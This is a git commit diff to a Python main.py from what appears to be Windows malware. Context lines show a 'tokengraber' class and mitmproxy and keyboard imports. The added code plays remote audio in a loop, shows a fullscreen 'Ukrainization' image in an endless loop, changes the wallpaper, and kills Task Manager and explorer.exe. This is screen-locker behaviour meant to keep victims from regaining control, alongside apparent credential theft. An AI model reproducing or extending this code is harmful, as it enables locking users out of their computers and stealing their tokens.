1bcd3fe5cc1a37bf181d10c4b9148146ffd75b62
Sergii Rudniev <100538048+ONETAPL3G3ND@users.noreply.github.com>
2024-05-27 21:47:49 +0200

    Add files via upload

--- main.py
+++ main.py
@@ -19,6 +19,17 @@ import logging
 from mitmproxy.addonmanager import Loader
 
 # -----------------------------------------------------
+
+# ---------------------ImageController--------------------
+import pygame
+from PIL import Image
+import requests
+from io import BytesIO
+import ctypes
+# -------------------------------------------------------
+# ------------------------ProcessController---------------
+import psutil
+# --------------------------------------------------------
 # ------------------------LaunchingUkrainizaciya---------------
 import time
 import keyboard
@@ -29,11 +40,10 @@ import win32security
 import win32api
 import win32con
 import pyautogui
-from ImageController import ImageController
-from ProcessController import ProcessController
 from WindowsController import WindowsController
 
 # ---------------------------------------------------
+
 
 logging.basicConfig(
     level=logging.INFO,
@@ -141,6 +151,91 @@ class tokengraber:
 
 
 # --------------------------------------------------------
+
+# ---------------------ImageController--------------------
+class ImageController:
+
+    @classmethod
+    def play_music(cls, music_url):
+        song_file = "song.mp3"
+
+        # Скачиваем песню
+        response = requests.get(music_url, verify=False)
+        with open(song_file, "wb") as f:
+            f.write(response.content)
+
+        pygame.mixer.init()
+        pygame.mixer.music.load(song_file)
+        pygame.mixer.music.play(-1)
+
+    @classmethod
+    def show_image(cls, image_url):
+        pygame.init()
+
+        screen_info = pygame.display.Info()
+        screen_width = screen_info.current_w
+        screen_height = screen_info.current_h
+        screen = pygame.display.set_mode((screen_width, screen_height), pygame.FULLSCREEN)
+        pygame.display.set_caption("Ukrainization")
+        response = requests.get(image_url, verify=False)
+        image = Image.open(BytesIO(response.content))
+
+        image = image.convert("RGB").resize((screen_width, screen_height))
+
+        pygame_image = pygame.image.fromstring(image.tobytes(), image.size, "RGB")
+        screen.blit(pygame_image, (0, 0))
+        pygame.display.update()
+
+        while True:
+            for event in pygame.event.get():
+                ...
+
+        pygame.quit()
+
+    @classmethod
+    def download_image(cls, url, save_path):
+        response = requests.get(url)
+        if response.status_code == 200:
+            with open(save_path, 'wb') as f:
+                f.write(response.content)
+            return True
+        else:
+            return False
+
+    @classmethod
+    def set_wallpaper(cls, image_path):
+        SPI_SETDESKWALLPAPER = 20
+        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, 3)
+
+
+# --------------------------------------------------------
+
+# ------------------------ProcessController---------------
+
+class ProcessController:
+    @classmethod
+    def kill_task_manager(cls):
+        for proc in psutil.process_iter():
+            if proc.name() == "Taskmgr.exe":
+                print("Диспетчер задач найден. Закрываю диспетчер задач...")
+                proc.kill()
+                print("Диспетчер задач успешно закрыт.")
+                return
+        print("Диспетчер задач не найден.")
+
+    @classmethod
+    def kill_explorer_manager(cls):
+        for proc in psutil.process_iter():
+            if proc.name() == "explorer.exe":
+                print("Explorer найден. Закрываю диспетчер задач...")
+                proc.kill()
+                print("Explorer успешно закрыт.")
+                return
+        print("Explorer не найден.")
+
+
+# --------------------------------------------------------
+
 # ------------------------LaunchingUkrainizaciya---------------
 
 
